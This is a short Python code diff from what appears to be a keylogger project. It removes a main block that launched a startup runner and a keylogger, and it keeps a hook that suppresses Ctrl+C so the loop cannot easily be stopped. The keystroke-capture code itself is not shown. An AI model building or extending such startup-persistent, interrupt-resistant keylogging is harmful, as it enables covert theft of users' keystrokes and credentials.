@@ -2,8 +2,8 @@
 
 import sys
 import time
-import background_runner
 import keylogger
+import test2
 
 def _suppress_keyboard_interrupt(exctype, value, tb):
     if exctype is KeyboardInterrupt:
@@ -33,8 +33,3 @@ def run_forever(INPUT):
                 time.sleep(1)
             except KeyboardInterrupt:
                 pass
-
-
-if __name__ == "__main__":
-    run_forever(background_runner.run_on_startup())
-    run_forever(keylogger.on_press())
